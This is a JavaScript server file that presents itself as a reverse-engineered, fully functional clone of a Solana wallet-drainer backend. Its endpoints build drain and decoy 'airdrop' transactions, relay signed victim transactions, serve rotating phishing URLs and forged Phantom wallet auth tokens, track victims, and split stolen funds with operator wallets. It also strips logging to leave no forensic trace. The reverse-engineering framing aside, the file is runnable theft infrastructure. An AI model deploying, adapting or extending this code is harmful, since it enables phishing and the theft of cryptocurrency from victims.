/**
 * server.js — Kiwi Pro Skittles Backend (Reverse-Engineered Clone)
 *
 * Reconstructed from:
 *   - Deobfuscated client bundle (frame_bundle_clean.js)
 *   - Active server probing of host-sol-endpoint.com
 *   - On-chain relay program disassembly (drainer_program.so)
 *   - Behavioral mapping (exampledomainname_.md)
 *
 * This is a complete functional clone of the skittles backend server.
 * It implements every endpoint, every payload schema, the encryption layer,
 * the wallet eligibility check, the transaction construction, the spoof/decoy
 * mechanism, the relay, and the Telegram notification system.
 *
 * ENDPOINTS (10 total, matching the original):
 *   GET  /okxdmnendpt              — returns current phishing front-end URL
 *   GET  /api/getLatestHeaders      — returns forged Phantom auth tokens
 *   POST /build-plain-drain         — builds drain tx (Phantom-only path)
 *   POST /build-spoof               — builds decoy airdrop tx
 *   POST /build-transaction         — builds drain tx (generic path)
 *   POST /relay-transaction         — relays signed tx to Solana
 *   POST /relay-plain               — relays signed plain-drain tx
 *   POST /notify-visit              — receives victim visit telemetry
 *   POST /notify-confirm            — receives drain confirmation
 *   POST /notify-reject             — receives rejection notification
 */

import express from "express";
import cors from "cors";
import { CONFIG } from "./config.js";
import { decryptMiddleware, encryptPayload, decryptEnvelope } from "./crypto.js";
import {
  checkWalletEligibility,
  buildDrainTransaction,
  buildSpoofTransaction,
  relayTransaction,
} from "./wallet.js";
import { generatePhantomHeaders } from "./phantom.js";
import {
  notifyVisit,
  notifyConfirm,
  notifyReject,
} from "./telegram.js";
import { addChatIds, removeChatIds, validChatIdCount } from "./chatids.js";
import {
  shouldNotifyVisit,
  recordVisit,
  recordReject,
  stashDrainPlan,
  popDrainPlan,
  recordDrain,
  pullStats,
} from "./stats.js";

// Shared secret with chimera (config.yaml drainer.service_key) — protects
// /admin/chat-ids and /admin/stats. Empty = admin endpoints disabled.
const SERVICE_KEY = process.env.SERVICE_KEY || "";

// Global safety nets — prevent RPC timeouts / Solana failures from
// crashing the process.  Express 4 does not auto-catch rejected promises
// from async route handlers, so without these an unhandled rejection
// kills Node 22+ silently.
// Silent exits — no error logging
process.on("unhandledRejection", () => process.exit(1));
process.on("uncaughtException", () => process.exit(1));

/** Wrap an async route handler so rejections become 500s, not crashes. */
const asyncHandler = (fn) => (req, res, next) =>
  Promise.resolve(fn(req, res, next)).catch(() => {
    res.status(500).json(encryptPayload({ error: "error" }));
  });

const app = express();

// ============================================================================
// MIDDLEWARE
// ============================================================================

// CORS — wide open, same as original (kit is called from arbitrary domains)
app.use(cors({ origin: CONFIG.corsOrigin }));

// Body parser with size limit (original returns 413 at ~1MB)
app.use(express.json({ limit: CONFIG.bodyLimit }));

// No request logging — zero forensic surface
let _reqCount = 0;
app.use((_req, _res, next) => { _reqCount++; next(); });

// ============================================================================
// ENCRYPTED ENDPOINTS (use the decrypt middleware)
// ============================================================================

/**
 * POST /build-plain-drain
 *
 * Builds unsigned drain transactions for Phantom wallets.
 * Request payload (decrypted):
 *   { userPublicKey, targetWallet, userChatId, clientIP, userAgent, domain, walletName, phase }
 *
 * Response (encrypted):
 *   Success: { unsignedTxs: [base64...], unsignedTxSpoof: base64 }
 *   Not eligible: { error: "Wallet not eligible." }
 *   Not Phantom: { error: "plain drain is Phantom-only", continueToBuild: true }
 *   Missing fields: { error: "Missing userPublicKey or targetWallet" }
 */
app.post("/build-plain-drain", decryptMiddleware, asyncHandler(async (req, res) => {
  const {
    userPublicKey,
    targetWallet,
    userChatId,
    usdcPayout,
    clientIP,
    userAgent,
    domain,
    walletName,
    phase,
  } = req.body || {};

  if (!userPublicKey || !targetWallet) {
    return res.json(encryptPayload({ error: "Missing userPublicKey or targetWallet" }));
  }

  // Check wallet eligibility
  const eligibility = await checkWalletEligibility(userPublicKey);

  if (!eligibility.eligible) {
    return res.json(
      encryptPayload({ error: eligibility.reason || "Wallet not eligible." })
    );
  }

  // /build-plain-drain is Phantom-only (confirmed by probing)
  if (walletName && walletName !== "phantom") {
    return res.json(
      encryptPayload({
        error: "plain drain is Phantom-only",
        continueToBuild: true,
      })
    );
  }

  // Build the drain transactions (targetWallet comes from the payload — multi-tenant)
  const result = await buildDrainTransaction(userPublicKey, {
    walletName,
    targetWallet,
    usdcPayout: !!usdcPayout,
    useProxyForTokens: CONFIG.useProxyForTokens,
  });

  if (result.drainPlan) {
    stashDrainPlan(userPublicKey, result.drainPlan);
  }

  return res.json(encryptPayload(result));
}));

/**
 * POST /build-spoof
 *
 * Builds the decoy "airdrop claim" transaction.
 * Requires x-spoof-auth header matching the encryption secret.
 *
 * Request payload (decrypted):
 *   { customAirdropMint, customAirdropAmount, userPublicKey, userChatId,
 *     clientIP, walletName, messageSignature, afterSignatureChallenge }
 *
 * Response (encrypted):
 *   Need signature: { needPhantomSignature: true }
 *   Success: { unsignedTxSpoof: base64, status: "ok" }
 *   Redirect: { status: "wl", url: "https://..." }
 */
app.post("/build-spoof", decryptMiddleware, asyncHandler(async (req, res) => {
  // Check x-spoof-auth header
  const spoofAuth = req.headers["x-spoof-auth"];
  if (spoofAuth !== CONFIG.spoofAuth) {
    return res.status(403).json({ error: "Invalid spoof auth" });
  }

  const {
    customAirdropMint,
    customAirdropAmount,
    userPublicKey,
    userChatId,
    clientIP,
    walletName,
    messageSignature,
    afterSignatureChallenge,
  } = req.body || {};

  if (!userPublicKey) {
    return res.json(encryptPayload({ error: "Missing userPublicKey" }));
  }

  // Build the spoof transaction
  const result = await buildSpoofTransaction(userPublicKey, {
    customAirdropMint: customAirdropMint || CONFIG.customAirdropMint,
    customAirdropAmount: customAirdropAmount || CONFIG.customAirdropAmount,
    walletName,
    messageSignature,
    afterSignatureChallenge,
  });

  return res.json(encryptPayload(result));
}));

/**
 * POST /build-transaction
 *
 * The generic drain transaction builder. Used for non-Phantom wallets
 * and as a fallback after the spoof flow.
 *
 * Request payload (decrypted):
 *   { spoofPrompt, hideChanges, userPublicKey, targetWallet, walletName,
 *     useProxyForTokens, customAirdropMint, customAirdropAmount,
 *     userChatId, clientIP, userAgent, domain, minValue }
 *
 * Response (encrypted):
 *   Success: { unsignedTxs: [base64...] } or { unsignedTx: base64 }
 *   Error: { error: "..." }
 */
app.post("/build-transaction", decryptMiddleware, asyncHandler(async (req, res) => {
  const {
    spoofPrompt,
    hideChanges,
    userPublicKey,
    targetWallet,
    walletName,
    useProxyForTokens,
    customAirdropMint,
    customAirdropAmount,
    userChatId,
    usdcPayout,
    clientIP,
    userAgent,
    domain,
    minValue,
  } = req.body || {};

  if (!userPublicKey || !targetWallet) {
    return res.json(encryptPayload({ error: "Missing userPublicKey or targetWallet" }));
  }

  // Check eligibility
  const eligibility = await checkWalletEligibility(userPublicKey);

  if (!eligibility.eligible) {
    return res.json(
      encryptPayload({ error: eligibility.reason || "Wallet not eligible." })
    );
  }

  if (eligibility.solBalance === 0) {
    return res.json(encryptPayload({ error: "zero SOL balance" }));
  }

  // Build drain transaction (targetWallet comes from the payload — multi-tenant)
  const result = await buildDrainTransaction(userPublicKey, {
    walletName,
    targetWallet,
    usdcPayout: !!usdcPayout,
    useProxyForTokens,
  });

  if (result.error) {
    return res.json(encryptPayload({ error: result.error }));
  }

  if (result.drainPlan) {
    stashDrainPlan(userPublicKey, result.drainPlan);
  }

  return res.json(encryptPayload({ unsignedTxs: result.unsignedTxs }));
}));

/**
 * POST /relay-transaction
 *
 * Relays a signed transaction to the Solana network.
 *
 * Request payload (decrypted):
 *   { signedTx: base64, userChatId, userPublicKey }
 *
 * Response (encrypted):
 *   Success: { ok: true, txid: "signature" }
 *   Error: { ok: false, error: "..." }
 */
app.post("/relay-transaction", decryptMiddleware, asyncHandler(async (req, res) => {
  const { signedTx, userChatId, userPublicKey } = req.body || {};

  if (!signedTx) {
    return res.json(encryptPayload({ error: "Missing signedTx" }));
  }

  const result = await relayTransaction(signedTx);

  if (result.ok) {
    // First successful relay of a batch consumes the stashed plan —
    // one event and one confirmation per drain, with amounts.
    const plan = popDrainPlan(userPublicKey);
    if (plan) {
      const chatId = userChatId || CONFIG.userChatId;
      recordDrain({
        chatId,
        victim: userPublicKey,
        targetWallet: plan.targetWallet,
        txid: result.txid,
        solLamports: plan.solLamports,
        operatorLamports: plan.operatorLamports,
        tokens: plan.tokens,
        usdc: plan.usdc,
      });
      await notifyConfirm({
        userPublicKey,
        userChatId: chatId,
        txids: [result.txid],
        txBatchIndex: 0,
        jupiterPartial: false,
        verified: true,
        amounts: {
          solLamports: plan.solLamports,
          operatorLamports: plan.operatorLamports,
          usdc: plan.usdc,
          tokens: plan.tokens,
        },
      });
    }
  }

  return res.json(encryptPayload(result));
}));

/**
 * POST /relay-plain
 *
 * Same as /relay-transaction but for the plain-drain flow.
 *
 * Request payload (decrypted):
 *   { signedTx: base64, userPublicKey }
 */
app.post("/relay-plain", decryptMiddleware, asyncHandler(async (req, res) => {
  const { signedTx, userPublicKey } = req.body || {};

  if (!signedTx) {
    return res.json(encryptPayload({ error: "Missing signedTx" }));
  }

  const result = await relayTransaction(signedTx);

  if (result.ok) {
    const plan = popDrainPlan(userPublicKey);
    if (plan) {
      const chatId = CONFIG.userChatId;
      recordDrain({
        chatId,
        victim: userPublicKey,
        targetWallet: plan.targetWallet,
        txid: result.txid,
        solLamports: plan.solLamports,
        operatorLamports: plan.operatorLamports,
        tokens: plan.tokens,
        usdc: plan.usdc,
      });
      await notifyConfirm({
        userPublicKey,
        userChatId: chatId,
        txids: [result.txid],
        txBatchIndex: 1,
        jupiterPartial: false,
        verified: true,
        amounts: {
          solLamports: plan.solLamports,
          operatorLamports: plan.operatorLamports,
          usdc: plan.usdc,
          tokens: plan.tokens,
        },
      });
    }
  }

  return res.json(encryptPayload(result));
}));

// ============================================================================
// PLAINTEXT ENDPOINTS (no encryption)
// ============================================================================

/**
 * GET /okxdmnendpt
 *
 * Returns the current phishing front-end URL.
 * The operator rotates this periodically by updating the server config.
 */
app.get("/okxdmnendpt", (_req, res) => {
  res.json({ url: CONFIG.currentFrontendUrl });
});

/**
 * GET /api/getLatestHeaders
 *
 * Returns forged Phantom wallet authentication tokens.
 * Generates fresh tokens on each request.
 */
app.get("/api/getLatestHeaders", (_req, res) => {
  const headers = generatePhantomHeaders();
  res.json({
    ok: true,
    headers,
  });
});

/**
 * POST /admin/chat-ids
 *
 * Chimera pushes customer chat-id registrations (anti-spoof validation).
 * Auth: X-Service-Key header, matching the SERVICE_KEY env.
 * Body: { add: [chatIds], remove: [chatIds] }
 */
app.post("/admin/chat-ids", (req, res) => {
  if (!SERVICE_KEY || req.get("X-Service-Key") !== SERVICE_KEY) {
    return res.status(403).json({ ok: false, error: "bad service key" });
  }
  const { add, remove } = req.body || {};
  addChatIds(add);
  removeChatIds(remove);
  res.json({ ok: true, count: validChatIdCount() });
});

/**
 * GET /admin/stats
 *
 * Chimera pulls funnel counters + drain events (pull-and-clear) right
 * before recycling the machine, and on demand for the bot's /stats.
 * Auth: X-Service-Key header.
 */
app.get("/admin/stats", (req, res) => {
  if (!SERVICE_KEY || req.get("X-Service-Key") !== SERVICE_KEY) {
    return res.status(403).json({ ok: false, error: "bad service key" });
  }
  res.json(pullStats());
});

/**
 * GET/POST /admin/operator — operator fee wallets + cut, live.
 *
 * splitSolAmounts() reads OPERATOR_WALLETS/OPERATOR_CUT from the env at
 * drain-build time, so mutating process.env here takes effect on the next
 * drain with no machine recycle. Chimera persists the value and re-injects
 * it at each recycle, so it survives rotation.
 * Auth: X-Service-Key header.
 */
const WALLET_RE_STR = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;

function currentOperatorConfig() {
  return {
    wallets: (process.env.OPERATOR_WALLETS || "").split(",").map((s) => s.trim()).filter(Boolean),
    cut: parseFloat(process.env.OPERATOR_CUT || "0") || 0,
  };
}

app.get("/admin/operator", (req, res) => {
  if (!SERVICE_KEY || req.get("X-Service-Key") !== SERVICE_KEY) {
    return res.status(403).json({ ok: false, error: "bad service key" });
  }
  res.json(currentOperatorConfig());
});

app.post("/admin/operator", (req, res) => {
  if (!SERVICE_KEY || req.get("X-Service-Key") !== SERVICE_KEY) {
    return res.status(403).json({ ok: false, error: "bad service key" });
  }
  const { wallets, cut } = req.body || {};
  if (!Array.isArray(wallets) || !wallets.length) {
    return res.status(400).json({ ok: false, error: "wallets must be a non-empty array" });
  }
  for (const w of wallets) {
    if (!WALLET_RE_STR.test(String(w))) {
      return res.status(400).json({ ok: false, error: `invalid wallet: ${w}` });
    }
  }
  process.env.OPERATOR_WALLETS = wallets.map(String).join(",");
  if (cut != null) {
    const c = parseFloat(cut);
    if (Number.isNaN(c) || c < 0 || c > 0.95) {
      return res.status(400).json({ ok: false, error: "cut must be 0–0.95" });
    }
    process.env.OPERATOR_CUT = String(c);
  }
  res.json(currentOperatorConfig());
});

/**
 * POST /notify-visit
 *
 * Receives victim visit telemetry.
 * Body: { browser, userAgent, ip, flag, country, referrer, userChatId }
 *
 * Same chat+IP inside 10 minutes counts once (page reloads and crawlers
 * hit this constantly) but every visit is counted in the funnel.
 */
app.post("/notify-visit", (req, res) => {
  const { browser, userAgent, ip, flag, country, referrer, userChatId } =
    req.body || {};

  recordVisit(userChatId);

  if (shouldNotifyVisit(userChatId, ip)) {
    notifyVisit({
      ip,
      country,
      flag,
      browser,
      userAgent,
      referrer,
      userChatId,
    });
  }

  res.json({ ok: true });
});

/**
 * POST /notify-confirm
 *
 * Receives drain confirmation.
 * Body: { userPublicKey, userChatId, txids, txBatchIndex, jupiterPartial }
 */
app.post("/notify-confirm", (req, res) => {
  const { userPublicKey, userChatId, txids, txBatchIndex, jupiterPartial } =
    req.body || {};

  notifyConfirm({
    userPublicKey,
    userChatId: userChatId || CONFIG.userChatId,
    txids,
    txBatchIndex,
    jupiterPartial,
  });

  res.json({ ok: true });
});

/**
 * POST /notify-reject
 *
 * Receives rejection notification.
 * Body: { userPublicKey, userChatId, reason }
 */
app.post("/notify-reject", (req, res) => {
  const { userPublicKey, userChatId, reason } = req.body || {};

  recordReject(userChatId);

  notifyReject({
    userPublicKey,
    userChatId: userChatId || CONFIG.userChatId,
    reason,
  });

  res.json({ ok: true });
});

// ============================================================================
// HEALTH
// ============================================================================

// Registered BEFORE the 404 catch-all — Express evaluates middleware in
// order, so this must come first or /health is unreachable.
app.get("/health", (_req, res) => res.status(200).end());

// ============================================================================
// ERROR HANDLING (matches original Express default behavior)
// ============================================================================

// 404 handler — Express default HTML (matches observed behavior)
app.use((_req, res) => {
  res.status(404).send(
    "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Not Found</pre>\n</body>\n</html>\n"
  );
});

// Error handler — Express default HTML (matches observed behavior)
app.use((err, _req, res, _next) => {
  if (err.type === "entity.too.large") {
    return res.status(413).send(
      "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Payload Too Large</pre>\n</body>\n</html>\n"
    );
  }
  if (err.type === "entity.parse.failed") {
    return res.status(400).send(
      "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Bad Request</pre>\n</body>\n</html>\n"
    );
  }
  res.status(500).send(
    "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Internal Server Error</pre>\n</body>\n</html>\n"
  );
});

// ============================================================================
// START
// ============================================================================

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  // No startup banner — zero info leakage
});

// deriveKeyPreview removed — no key preview, ever
